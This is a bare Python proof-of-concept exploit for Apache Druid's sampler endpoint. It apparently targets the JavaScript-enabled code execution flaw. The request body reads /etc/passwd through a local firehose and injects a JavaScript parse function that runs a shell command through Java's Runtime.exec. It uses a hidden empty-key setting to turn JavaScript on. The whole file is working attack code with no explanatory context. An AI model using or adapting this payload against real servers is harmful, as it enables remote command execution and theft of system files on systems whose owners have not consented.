import requests

url = "http://localhost:8888/druid/indexer/v1/sampler"

headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en-US;q=0.9,en;q=0.8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
    "Connection": "close",
    "Cache-Control": "max-age=0",
    "Content-Type": "application/json"
}

data = {
    "type": "index",
    "spec": {
        "ioConfig": {
            "type": "index",
            "firehose": {
                "type": "local",
                "baseDir": "/etc",
                "filter": "passwd"
            }
        },
        "dataSchema": {
            "dataSource": "test",
            "parser": {
                "parseSpec": {
                    "format": "javascript",
                    "timestampSpec": {},
                    "dimensionsSpec": {},
                    "function": 'function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","hi"]).getInputStream()).useDelimiter("\\A").next();return {timestamp:123123,test: a}}',
                    "": {
                        "enabled": "true"
                    }
                }
            }
        }
    },
    "samplerConfig": {
        "numRows": 10
    }
}

c = requests.post(url, headers=headers, json=data)
print(c.text)